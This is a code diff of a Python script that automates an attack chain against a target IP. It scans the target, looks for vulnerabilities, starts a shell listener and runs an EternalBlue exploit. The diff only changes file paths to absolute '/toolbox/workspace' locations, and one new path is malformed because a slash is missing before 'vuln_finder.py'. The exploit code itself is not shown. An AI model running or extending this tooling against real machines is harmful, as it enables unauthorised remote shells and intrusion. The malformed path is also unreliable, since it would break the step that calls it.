@@ -17,11 +17,11 @@ def main():
 
     # Step 1: Run scanner.py
     print("\n[1] Scanning target...")
-    run_script("scanner.py", [target_ip])
+    run_script("/toolbox/workspace/scanner.py", [target_ip])
 
     # Step 2: Run vuln_finder.py
     print("\n[2] Finding vulnerabilities...")
-    run_script("vuln_finder.py")
+    run_script("/toolbox/workspacevuln_finder.py")
 
     # Step 3: Start listener in background
     print("\n[3] Starting shell listener...")
@@ -36,7 +36,7 @@ def main():
 
     # Step 4: Run EternalBlue exploit
     print("\n[4] Running EternalBlue exploit...")
-    run_script(os.path.join("every_exploits", "eternalblue.py"))
+    run_script(os.path.join("/toolbox/workspace/every_exploits", "eternalblue.py"))
 
 if __name__ == "__main__":
     main()
